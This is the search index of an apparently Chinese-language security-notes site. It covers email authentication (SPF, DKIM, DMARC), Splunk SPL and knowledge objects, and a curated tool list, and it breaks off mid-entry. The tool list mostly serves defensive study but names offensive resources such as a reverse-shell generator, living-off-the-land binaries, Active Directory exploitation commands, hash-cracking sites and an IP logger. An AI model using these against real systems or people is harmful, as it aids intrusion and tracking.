{"config":{"lang":["zh","ja","en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u4e3b\u9875","text":""},{"location":"#_1","title":"\u9776\u673a\u5e73\u53f0","text":""},{"location":"#certificates","title":"Certificates","text":"<p>\u7075\u611f\u6765\u6e90\uff1ahttps://ctf-wiki.org/</p> <p>For full documentation visit mkdocs.org, and mkdocs-material.</p>"},{"location":"material-color-palette/","title":"\u914d\u8272\u53d8\u66f4","text":""},{"location":"material-color-palette/#material-color-palette","title":"Material color palette \u989c\u8272\u4e3b\u9898","text":""},{"location":"material-color-palette/#color-scheme","title":"Color Scheme \u914d\u8272\u65b9\u6848","text":"<p>\u6839\u636e\u6d4f\u89c8\u5668\u4e0e\u7cfb\u7edf\u8bbe\u7f6e\u81ea\u52a8\u5207\u6362\u660e\u6697\u4e3b\u9898\uff0c\u4e5f\u53ef\u624b\u52a8\u5207\u6362</p> <code>Default</code> <code>Slate</code>"},{"location":"material-color-palette/#primary-colors","title":"Primary colors \u4e3b\u8272","text":"<p>\u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code> <code>Brown</code> <code>Grey</code> <code>Blue Grey</code> <code>White</code>"},{"location":"material-color-palette/#accent-colors","title":"Accent colors \u8f85\u52a9\u8272","text":"<p>\u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code>"},{"location":"tool-links/","title":"Tool Links","text":""},{"location":"tool-links/#_1","title":"\u7f16\u7801","text":"<ul> <li>CyberChef</li> <li>MD5\u89e3\u7801\uff1a<ul> <li>https://md5.gromweb.com/</li> <li>https://www.somd5.com/</li> <li>https://hashes.com/en/decrypt/hash/</li> <li>https://crackstation.net/</li> <li>https://md5hashing.net/hash/md5/</li> <li>https://www.dcode.fr/md5-hash/</li> </ul> </li> </ul>"},{"location":"tool-links/#shell","title":"shell","text":"<ul> <li>\u53cd\u5f39shell\u751f\u6210\u5668</li> <li>shell\u547d\u4ee4\u89e3\u91ca</li> </ul>"},{"location":"tool-links/#lolliving-off-the-land","title":"LOL\uff08Living Off the Land\uff09","text":"<ul> <li>GTFOBins</li> <li>LOLBAS<ul> <li>WADComs: a quick view of which commands you can run to enumerate/exploit an AD.</li> </ul> </li> </ul>"},{"location":"tool-links/#_2","title":"\u6f0f\u6d1e\u5e93","text":"<ul> <li>Vulners</li> <li>exploit-db</li> <li>rapid7-db</li> </ul>"},{"location":"tool-links/#ioc","title":"IoC","text":"<ul> <li>GreyNoise</li> <li>ThreatMiner</li> <li>VirusTotal</li> <li>Threat Intelligence Platform</li> <li>Robtex\uff1aa Threat Intel site that provides information about IP addresses, domain names, etc.</li> <li>https://otx.alienvault.com/</li> <li>InQuest</li> <li>Reputation Center\uff08\u601d\u79d1\uff09\uff1ahttps://talosintelligence.com/reputation</li> <li>OPSWAT MetaDefender</li> <li>\uff08greynoise.io\uff1a\u6709API\u7684\u8bdd\u53ef\u4ee5\u53bbgithub\u88c5\u5ba2\u6237\u7aef\uff09</li> <li>ABUSE.ch: community driven threat intelligence.<ul> <li>Malware Bazaar:  A resource for sharing malware samples.</li> <li>Feodo Tracker:  A resource used to track botnet command and control (C2) infrastructure linked with Emotet, Dridex and TrickBot.</li> <li>SSL Blacklist:  A resource for collecting and providing a blocklist for malicious SSL certificates and JA3/JA3s fingerprints.</li> <li>URL Haus:  A resource for sharing malware distribution sites.</li> <li>Threat Fox:  A resource for sharing indicators of compromise (IOCs).</li> </ul> </li> </ul>"},{"location":"tool-links/#malware-hash","title":"Malware hash","text":"<ul> <li>MalwareBazaar</li> <li>MalShare</li> </ul>"},{"location":"tool-links/#_3","title":"\u56fd\u5185","text":"<ul> <li>\u5947\u5b89\u4fe1\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3</li> <li>360\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3</li> <li>\u60c5\u62a5\u793e\u533aX</li> </ul>"},{"location":"tool-links/#have-ipdomain","title":"have IP/Domain","text":"<ul> <li>BGP Toolkit</li> <li>\u591a\u5730ping\uff1ahttps://check-host.net/</li> <li>DB\uff1ahttps://securitytrails.com/<ul> <li>\u57df\u540d\u89e3\u6790\u5386\u53f2\u3001\u5b50\u57df</li> <li>IP\u53cd\u67e5\u57df\u540d</li> </ul> </li> <li>https://dnsdumpster.com/</li> <li>ViewDNS</li> <li>https://site.ip138.com/ \uff08\u56fd\u9645\u7248\uff1ahttps://dnsdblookup.com/\uff09<ul> <li>\u57df\u540d\u89e3\u6790\u5386\u53f2</li> </ul> </li> <li>https://securityheaders.com/\uff1a\u5206\u6790 HTTP \u54cd\u5e94\u6807\u5934\u5e76\u63d0\u4f9b\u76ee\u6807\u7ad9\u70b9\u5b89\u5168\u72b6\u51b5\u7684\u57fa\u672c\u5206\u6790\u3002</li> </ul>"},{"location":"tool-links/#have-domain","title":"have Domain","text":"<ul> <li>https://who.is/</li> <li>https://www.whoxy.com/</li> <li>https://whois.domaintools.com/</li> <li>https://whois.gandi.net/</li> <li>https://searchdns.netcraft.com/</li> <li>ICP\u5907\u6848\u67e5\u8be2\uff1ahttps://beian.miit.gov.cn/#/Integrated/recordQuery</li> </ul>"},{"location":"tool-links/#have-ip","title":"have IP","text":"<ul> <li>ipinfo.io\uff1a<code>curl ipinfo.io/xx.xx.xx.xx</code></li> <li>IP\u53cd\u67e5\u57df\u540d\uff1ahttps://dns.aizhan.com/</li> </ul>"},{"location":"tool-links/#_4","title":"\u7f51\u7edc\u7a7a\u95f4\u8d44\u4ea7\u641c\u7d22\u5f15\u64ce","text":"<ul> <li>Shodan</li> <li>Censys</li> <li>FOFA</li> </ul>"},{"location":"tool-links/#sandbox","title":"SandBox","text":"<ul> <li>Hybrid-Analysis</li> <li>\u5fae\u6b65\u4e91\u6c99\u7bb1</li> <li>https://app.any.run/\uff08\u8981\u6ce8\u518c\uff09</li> </ul>"},{"location":"tool-links/#_5","title":"\u6d4f\u89c8\u5668\u6c99\u7bb1","text":"<ul> <li>https://www.wannabrowser.de/\uff1a\u770b\u7f51\u9875\u6e90\u7801</li> <li>https://urlscan.io/\uff1a\u622a\u56fe&amp;\u5173\u8054\u4fe1\u606f</li> <li>https://www.browserling.com/\uff1a\u684c\u9762\u4ea4\u4e92</li> </ul>"},{"location":"tool-links/#email","title":"Email","text":"<ul> <li>Email\u4fe1\u8a89\uff1a<code>curl emailrep.io/name.what@gmail.com</code></li> </ul>"},{"location":"tool-links/#email-header","title":"Email Header","text":"<ul> <li>Messageheader</li> <li>Message Header Analyzer</li> <li>https://mailheader.org/</li> </ul>"},{"location":"tool-links/#_6","title":"\u5ba2\u6237\u7aef/\u6307\u7eb9\u8bc6\u522b","text":"<ul> <li>UA\u8bc6\u522b\uff1a<ul> <li>WhatIsMyBrowser</li> <li>https://useragentstring.com/index.php</li> </ul> </li> <li>\u8ffd\u8e2a/\u9493\u9c7c\u751f\u6210\uff1aCanarytokens</li> <li>\u8ffd\u8e2a/\u5728\u7ebfIP Logger\uff1agrabify</li> <li>FingerprintJS</li> </ul>"},{"location":"tool-links/#mitre-attck","title":"MITRE ATT&amp;CK\u00ae\u76f8\u5173","text":"<ul> <li>MITRE ATT&amp;CK\u00ae Navigator</li> <li>DeTT&amp;CT : Mapping detection to MITRE ATT&amp;CK</li> </ul>"},{"location":"tool-links/#other","title":"Other","text":"<ul> <li>Web\u6863\u6848\uff1ahttps://archive.org/</li> <li>\u753b\u5e03\uff1ahttps://excalidraw.com/</li> <li>\u72fc\u7ec4\u5b89\u5168\u56e2\u961f\u516c\u5f00\u77e5\u8bc6\u5e93\uff1ahttps://wiki.wgpsec.org/</li> </ul>"},{"location":"BlueTeam/Email%E5%AE%89%E5%85%A8/","title":"Email\u5b89\u5168","text":"<p>https://github.com/nicanorflavier/spf-dkim-dmarc-simplified - Phishing Attacks \u2192 SPF - Brand Impersonation \u2192 DKIM - Business Email Compromise (BEC) \u2192 DMARC</p> <p>\u4f8b\u5b50\uff1a</p> <p>\u5982\u679c\u94f6\u884c\u6ca1\u6709\u5b9e\u65bd SPF/DKIM/DMARC\uff0c\u653b\u51fb\u8005\u5192\u5145\u8be5\u94f6\u884c\u53d1\u9001\u9493\u9c7c\u90ae\u4ef6\uff0c\u800c\u90ae\u4ef6\u53ef\u80fd\u4f1a\u901a\u8fc7\u6536\u4ef6\u670d\u52a1\u5668\u7684\u68c0\u67e5\u5e76\u8fdb\u5165\u7528\u6237\u7684\u6536\u4ef6\u7bb1\u3002\u7528\u6237\u5219\u8ba4\u4e3a\u8be5\u7535\u5b50\u90ae\u4ef6\u6765\u81ea\u4ed6\u4eec\u7684\u94f6\u884c\u3002</p> <p>SPF/DKIM/DMARC \u90fd\u7b97\u662f\u7528\u4e8e\u9a8c\u8bc1\u53d1\u4fe1\u4eba\u7684\u6b63\u5f53\u6027\u3002</p>","tags":["IT/\u7f51\u7edc","IT/\u84dd\u961f"]},{"location":"BlueTeam/Email%E5%AE%89%E5%85%A8/#spf","title":"SPF","text":"<p>Sender Policy Framework</p> <p>\u7b97\u662f\u4e00\u4e2a\u6388\u6743/\u8bb8\u53ef\u6e05\u5355\uff0c\u6307\u5b9a\u8c01\u53ef\u4ee5\u4ee3\u8868\u6211/\u57df\u53d1\u9001\u90ae\u4ef6\u3002\u522b\u4eba\uff08\u6536\u4ef6\u65b9\uff09\u53ef\u4ee5\u6765\u67e5\u770b\u6211\u7684\u6e05\u5355\u786e\u8ba4\u90ae\u4ef6\u7684\u53d1\u4ef6\u4eba\u662f\u5426\u6709\u6211\u7684\u6388\u6743\u3002</p> <p>\u5728DNS\u7684TXT\u8bb0\u5f55\u4e2d\u5b9a\u4e49\u3002\u683c\u5f0f\u901a\u5e38\u5982\u4e0b\uff1a <pre><code>v=spf1 ip4:123.123.123.123 ~all\n</code></pre></p> <p>Here's the command I usually run to fetch that: <pre><code>dig TXT example.com\n</code></pre></p> <p>2. What's the difference between ~all, -all, ?all, and +all in an SPF record?</p>","tags":["IT/\u7f51\u7edc","IT/\u84dd\u961f"]},{"location":"BlueTeam/Email%E5%AE%89%E5%85%A8/#dkim","title":"DKIM","text":"<p>Domain Keys Identified Mail</p> <p>\u8fd8\u662f\u5e94\u7528\u516c\u94a5\u57fa\u76d8\u2014\u2014\u5728TXT\u8bb0\u5f55\u4e2d\u53d1\u5e03\u516c\u94a5\uff0c\u53d1\u4fe1\u65f6\u5728\u91cc\u9762\u6dfb\u52a0\u4e00\u6bb5\u6458\u8981\uff08\u79c1\u94a5\u7b7e\u540d\uff09\u3002\u6536\u4ef6\u65b9\u53ef\u4ee5\u67e5\u627e\u9001\u4fe1\u65b9DNS\u7684\u516c\u94a5\u786e\u8ba4\u90ae\u4ef6\u662f\u5426\u88ab\u7be1\u6539\u3002</p> <p>TXT\u8bb0\u5f55\u4e2d\u7684\u683c\u5f0f\u901a\u5e38\u5982\u4e0b\uff1a <pre><code>v=DKIM1; k=rsa; p=NICfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBolTXCqbxwoRBffyg2efs+Dtlc+CjxKz9grZGBaISRvN7EOZNoGDTyjbDIG8CnEK479niIL4rPAVriT54MhUZfC5UU4OFXTvOW8FWzk6++a0JzYu+FAwYnOQE9R8npKNOl2iDK/kheneVcD4IKCK7IhuWf8w4lnR6QEW3hpTsawIDAQ0B\"\n</code></pre></p> <p>Here's the command I usually run to fetch that: <pre><code>dig TXT selector1._domainkey.example.com\n</code></pre></p> <p>https://milestone-of-se.nesuke.com/l7protocol/smtp/dkim-spf-senderid/</p>","tags":["IT/\u7f51\u7edc","IT/\u84dd\u961f"]},{"location":"BlueTeam/Email%E5%AE%89%E5%85%A8/#dmarc","title":"DMARC\u6807\u51c6","text":"<p>Domain-based Message Authentication Reporting and Conformance</p> <p>\u7ed3\u5408\u4e86\uff08DNS\u7684\uff09SPF\u6216DKIM\u3002\u5b83\u5141\u8bb8\u57df\u540d\u6240\u6709\u8005\u8bbe\u7f6e\u4e00\u4e2a\u7b56\u7565\uff0c\u6307\u793a\u63a5\u6536\u90ae\u4ef6\u670d\u52a1\u5668\u5982\u4f55\u5904\u7406\u672a\u901a\u8fc7 SPF \u548c DKIM \u9a8c\u8bc1\u7684\u90ae\u4ef6\u3002\u6bd4\u5982\u53d1\u9001\u62a5\u544a\u3002</p> <p>TXT\u8bb0\u5f55\u4e2d\u7684\u683c\u5f0f\u901a\u5e38\u5982\u4e0b\uff1a <pre><code>v=DMARC1; p=none; rua=mailto:postmaster@example.com\n</code></pre></p> <p>Here's the command I usually run to fetch that: <pre><code>dig TXT _dmarc.example.com\n</code></pre></p>","tags":["IT/\u7f51\u7edc","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/","title":"Knowledge Object","text":"<p>Knowledge Objects\u662f\u4e00\u7ec4\u7528\u4e8e\u53d1\u73b0\u548c\u5206\u6790\u6570\u636e\u7684\u5de5\u5177\u3002\u5373splunk\u754c\u9762\u4e2d\uff0c\u70b9\u8bbe\u5b9a\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5927\u5206\u7c7b\u5c31\u53ebKnowledge\uff01</p> <ul> <li>\u6743\u9650\uff1a\u5373\u79c1\u4eba\u3001\u67d0\u4e2aAPP\u3001\u6240\u6709APP\u2014\u2014\u6240\u4ee5\u53cd\u63a8\uff0c\u80fd\u8c03\u6574\u8fd9\u4e9b\u6743\u9650\u7684\u90fd\u7b97Knowledge Object\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#knowledge-object-5","title":"Knowledge Object 5\u5927\u5206\u7c7b","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#1-data-interpretation","title":"1. Data Interpretation","text":"<ul> <li>\u5b57\u6bb5</li> <li>\u5b57\u6bb5\u63d0\u53d6\uff08\u81ea\u52a8\u3001\u624b\u52a8\uff09<ul> <li>\u5b57\u6bb5\u8ba1\u7b97\u2014\u2014eval\u3002</li> </ul> </li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#field-extractions","title":"Field Extractions","text":"<p>3\u4e2a\u4f7f\u7528\u5165\u53e3\uff1a</p> <ul> <li>Settings\u2014\u2014\u5b57\u6bb5</li> <li>\u4fa7\u8fb9\u680f\u6700\u4e0b\u9762</li> <li>Event Actions menu\uff08\u641c\u7d22\u7ed3\u679c\u6bcf\u884c\u4e2d\u7684\u6309\u94ae\uff0c\u6700\u5feb\u2014\u2014\u76f4\u63a5\u5230\u8fbe\u9009\u62e9\u63d0\u53d6\u65b9\u5f0f\u7684\u754c\u9762\uff09</li> </ul> <p>field extractor\u81ea\u52a8\u5e2e\u6211\u4eec\u6784\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p> <p>\u68c0\u67e5\u63d0\u53d6\u5b57\u6bb5\u6d88\u8017\u4e86\u591a\u5c11\u641c\u7d22\u6027\u80fd\uff1aInspect Job\u2014\u2014<code>command.search.kv</code>\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#2-data-classification","title":"2. Data Classification","text":"<ul> <li>Event Types\uff1a\u4fdd\u5b58\u641c\u7d22\u65f6\u53ef\u9009\u3002\u4e4b\u540e\u8c03\u7528\uff1aeventtype= <li>Transactions</li>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#event-types","title":"Event Types","text":"<p>\u521b\u5efa\u65b9\u5f0f\uff08\u8fd8\u53ef\u4ee5\u914d\u7f6e\u989c\u8272\uff09\uff1a</p> <ul> <li>\u5c06\u641c\u7d22\u7ed3\u679c\u4fdd\u5b58\u4e3a\u2014\u2014Event Types</li> <li>\u6bcf\u884c\u641c\u7d22\u7ed3\u679c\u7684actions\u2014\u2014build Event Types</li> <li>Settings\u2014\u2014New Event Types</li> </ul> <p>[!NOTE] Event Types\u4e0d\u53ef\u5305\u542b\u65f6\u95f4\u8303\u56f4\u2014\u2014\u800c\u4fdd\u5b58\u62a5\u544a\u53ef\u4ee5</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#3-data-enrichment","title":"3. Data Enrichment","text":"<ul> <li>Lookups</li> <li>Workflow Actions\uff1a\u5c31\u662fEvent Actions\u91cc\u7684\u6309\u94ae\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#lookups","title":"Lookups","text":"<ul> <li>SPL memo#lookup</li> <li>SPL memo#inputlookup</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#lookups_1","title":"Lookups\u56db\u79cd\u7c7b\u578b","text":"<ul> <li>file-base\uff1aCSV</li> <li>external\uff1ascript</li> <li>KV store</li> <li>geospatial</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#external-lookups","title":"External lookups","text":"<p>\u5c31\u662f\u8c03\u7528\u670d\u52a1\u5668\u4e0a\u7684\u811a\u672c\u3002</p> <ul> <li><code>$SPLUNK_HOME/bin/scripts</code></li> <li><code>$SPLUNK_HOME/etc/apps/&lt;AppName&gt;/bin/scripts</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#kv-store-lookups","title":"KV store lookups","text":"<p>\u9002\u7528\u4e8e\u5927\u578b\u6587\u4ef6\u3002\uff08CSV\u7684\u8bdd\u4f1a\u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6\u800cKV\u4e0d\u662f\uff09</p> <p>\u9700\u8981admin\u5b9a\u4e49conf</p> <p>\u521b\u5efalookup definition\u540e\uff0c\u586b\u5145store\u7684\u65b9\u5f0f\uff1a\u7528 <code>| outputlookup &lt;definition_name&gt;</code> \u547d\u4ee4\uff0c\u5c06\u641c\u7d22\u7ed3\u679c\u5199\u5165\u3002</p> <p>\u53e6\u4e00\u79cd\u65b9\u5f0f\uff1asplunk REST API\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#kv-store-vs-csv","title":"KV store VS. CSV","text":"<ul> <li>\u53ef\u4ee5\u6bcf\u884c\u66f4\u65b0</li> <li>\u652f\u6301\u5b57\u6bb5\u52a0\u901f</li> <li>\u652f\u6301\u591a\u7528\u6237\u8bbf\u95ee\u9501</li> <li>\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff08CSV\u9ed8\u8ba4\u654f\u611f\uff0c\u4f46\u662f\u4e5f\u80fd\u8c03\u4e0d\u654f\u611f\uff09</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#geospatial-lookups","title":"Geospatial lookups","text":"<p>\u8f93\u5165KML/KMZ\u6587\u4ef6\uff0c\u8f93\u51fageo\u4fe1\u606f\uff08\u4f3c\u4e4e\u4e0d\u662f\u70b9\u4fe1\u606f\uff0c\u800c\u662f\u76f4\u63a5\u7ed8\u5236\u5730\u56fe/\u533a\u57df\uff09\u7684\u5b57\u6bb5\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#workflow-actions","title":"Workflow Actions","text":"<p>\u521b\u5efa\u65b9\u5f0f\uff1aSettings\u2014\u2014\u5b57\u6bb5\u3002</p> <ul> <li>\u4f20\u9012\u6307\u5b9a\u5b57\u6bb5\u7684\u503c\uff1a<code>$&lt;field&gt;$</code> </li> <li>\u5982\u679c\u503c\u9700\u8981\u8f6c\u4e49\uff08\u52a0\u4e2a\u611f\u53f9\u53f7\uff09\uff1a<code>$!&lt;field&gt;$</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#4-data-normalization","title":"4. Data Normalization","text":"<ul> <li>\u5b57\u6bb5\u522b\u540d</li> <li>Tags</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#field-aliases","title":"Field Aliases","text":"<ul> <li>GUI\u914d\u7f6e\u65b9\u5f0f\uff1a\u65e2\u6709\u5b57\u6bb5\u540d=\u522b\u540d</li> </ul> <p>[!NOTE] One alias for each sourcetype</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#tags","title":"Tags","text":"<ul> <li>\u7528\u952e\u503c\u5bf9\uff0c\u6307\u5b9a\u63cf\u8ff0\u6027\u7684\u540d\u5b57</li> <li>tag\u540d\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\uff01</li> <li>\u53ef\u4ee5\u7528\u901a\u914d\u7b26</li> <li>\u4e5f\u53ef\u7528\u8fd9\u79cd\u5f62\u5f0f\u641c\u7d22\u5b57\u6bb5\u4e0e\u5176\u5206\u914d\u7684\u503c\uff1a<code>tag::&lt;field&gt;=&lt;tag_name&gt;</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#5-data-models","title":"5. Data Models","text":"<ul> <li>Hierarchy Structured Datasets</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#reportalertmacros","title":"\u8fd8\u6709\u4fdd\u5b58\u7684\u641c\u7d22\uff0cReport\u3001alert\u3001macros\u7b49","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#macros","title":"Macros","text":"<p>\u521b\u5efa\u65b9\u5f0f\uff1aSettings\u2014\u2014\u9ad8\u7ea7\u641c\u7d22</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#_1","title":"\u6dfb\u52a0\u53c2\u6570","text":"<p>\u53e6\u5916\uff1a\u53ef\u4ee5\u7528fieldformat\u6765\u8ba9\u7ed3\u679c\u53ef\u4ee5\u7528\u6570\u5b57\u987a\u5e8f\u6392\u5217\u3002\u7528eval\u7684\u8bdd\u5219\u662f\u4ee5\u5b57\u6bcd\u6392\u5217\u3002</p> <p></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Knowledge%20Object/#_2","title":"\u547d\u540d\u7ea6\u5b9a","text":"<p>6 segmented keys\uff1a</p> <ol> <li>Group\uff1a\u7ec4\u7ec7\u5185\u7684\u56e2\u961f\u540d\u3001\u6240\u5c5e</li> <li>Type\uff1aKnowledge Object Type</li> <li>Platform\uff1a\u5927\u90e8\u95e8\uff1f</li> <li>Category\uff1a\u804c\u80fd</li> <li>Time\uff1ana for NOT time-base</li> <li>Description\uff1a\u63cf\u8ff0</li> </ol> <p>\u4e3b\u8981\u662f\u4e3a\u4e86\u8868\u8fbe\u6e05\u695a\u4e0b\u9762\u7684\u4fe1\u606f\uff1a</p> <ul> <li>WHO\uff1aGroup</li> <li>WHAT it does\uff1aType\u3001Platform\u3001Category\u3001Time</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/","title":"SPL memo","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#tutorial","title":"Tutorial","text":"<p>https://docs.splunk.com/Documentation/Splunk/9.0.1/SearchTutorial/WelcometotheSearchTutorial</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_1","title":"\u975e\u5e38\u6709\u7528","text":"<p>https://www.splunk.com/en_us/blog/security/hunting-with-splunk-the-basics.html</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_2","title":"\u8bed\u6cd5\u6ce8\u610f\u70b9","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#andornot","title":"\u5e03\u5c14\u8fd0\u7b97\u7b26\u5fc5\u987b\u5927\u5199\uff08AND\uff0cOR\uff0cNOT\uff09","text":"<ul> <li>\u6709\u4f18\u5148\u5ea6\uff1a\u5c0f\u62ec\u53f7\u8868\u8fbe\u5f0f&gt;NOT&gt;AND&gt;OR</li> <li>\u7a7a\u683c\u9ed8\u8ba4\u4e3aAND</li> <li>\u53ef\u7528\u62ec\u53f7\u5206\u7ec4</li> <li>OR\u7684\u5217\u8868\u8868\u793a\uff1a\u5b57\u6bb5 IN (value1, value2, value3)</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#not","title":"\u5173\u4e8eNOT \u548c !=","text":"<ul> <li>\"NOT\" \u53ef\u4ee5\u5bf9\u641c\u7d22\u7ed3\u679c\u8fdb\u884c\u5426\u5b9a\u3002\u641c\u7d22\u7ed3\u679c\u5c06\u8fd4\u56de\u4e0d\u5305\u542b\u6307\u5b9a\u5b57\u6bb5\u540d\u3001\u548c\u503c\u7684\u4e8b\u4ef6\u3002</li> <li>\"!=\" \u7528\u4e8e\u5728SPL\u4e2d\u5bf9\u5b57\u6bb5\u8fdb\u884c\u6bd4\u8f83\uff08\u5373\u9ed8\u8ba4\u4e86\u8fd9\u4e2a\u5b57\u6bb5\u5fc5\u987b\u5b58\u5728\uff09</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#field_namefield_value","title":"\u5b57\u6bb5\u641c\u7d22\uff08field_name=field_value\uff09","text":"<ul> <li>key\u533a\u5206\u5927\u5c0f\u5199</li> <li>value\u4e0d\u5206\u5927\u5c0f\u5199</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#urldecode","title":"<code>urldecode()</code>","text":"<p>\u5185\u7f6eURL\u89e3\u7801</p> <ul> <li><code>urldecode(\"url-string\")</code></li> <li><code>urldecode(url-field)</code></li> </ul> <p>[!NOTE] \u4e0d\u8981\u5728\u5b57\u6bb5\u540d\u79f0\u4e24\u8fb9\u4f7f\u7528\u53cc\u5f15\u53f7 <code>\"</code>\u3002 \u5c1d\u8bd5\u4e0d\u5e26\u5f15\u53f7\u3002\u5982\u679c\u8fd9\u4e0d\u8d77\u4f5c\u7528\uff0c\u8bf7\u4f7f\u7528\u5355\u5f15\u53f7 <code>'</code>\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_3","title":"\u5730\u7406\u5730\u56fe","text":"| iplocation  | geostats Choropleth maps\u7b49\u503c\u7ebf\u56fe | geom KMZ: compressed Keyhole Markup Language file\u3002","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#lookup","title":"lookup","text":"<p>\u7528\u4e8e\u5728\u641c\u7d22\u65f6\u8ffd\u52a0\u5916\u90e8\u5b57\u6bb5\u3002 \u751a\u81f3\u6709\u81ea\u52a8\u3002</p> <p><code>...| lookup &lt;lookup-table-name&gt; &lt;lookup-field1&gt; AS &lt;field-on-searchResult&gt; [output|outputnew filed2 filed3]</code></p> <ul> <li>\u610f\u601d\u662f\uff1a\u5728\u6307\u5b9a\u7684table\u4e2d\u5339\u914d<code>&lt;lookup-field1&gt;</code>\u4e0e\u641c\u7d22\u7ed3\u679c\u4e2d\u7684\u5b57\u6bb5\uff08\u7531<code>AS</code>\u6307\u5b9a\uff0c\u672c\u8d28\u4e3a\u91cd\u547d\u540d\uff09\u5339\u914d\uff0c\u5e76\u8ffd\u52a0\u5339\u914d\u884c\u7684\u6307\u5b9aOUTPUT\u5b57\u6bb5\uff08\u4e0d\u6307\u5b9a\u9ed8\u8ba4\u8ffd\u52a0\u6240\u6709\u5b57\u6bb5\uff09</li> <li><code>&lt;lookup-field1&gt;</code>\uff1a\u9700\u8981event\u548clookup\u8868\u7684\u5b57\u6bb5\u540c\u540d</li> <li>\u5339\u914d\u4e0d\u5230\u7684\u5c06\u4f1a\u8d4b\u503cNULL</li> <li>output\uff1a\u8986\u76d6\u5df2\u6709\u5b57\u6bb5</li> <li>outputnew\uff1a\u4e0d\u8986\u76d6</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#lookup_1","title":"lookup\u8c03\u8bd5","text":"<p>job\u68c0\u67e5\u91cc\u7684 <code>command.search.lookups</code>\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#cidr-lookup","title":"CIDR lookup","text":"<p>[!NOTE] 